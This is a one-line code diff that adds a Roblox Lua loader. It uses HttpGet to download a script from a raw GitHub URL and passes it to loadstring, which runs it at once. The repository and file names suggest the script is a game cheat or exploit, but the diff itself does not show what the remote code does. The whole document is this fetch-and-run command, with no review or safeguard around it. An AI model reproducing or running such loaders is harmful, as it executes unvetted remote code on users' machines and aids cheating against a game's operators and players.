@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/shoot-for-eggs-spam7-zvfkal72g0v2hb.lua"))()
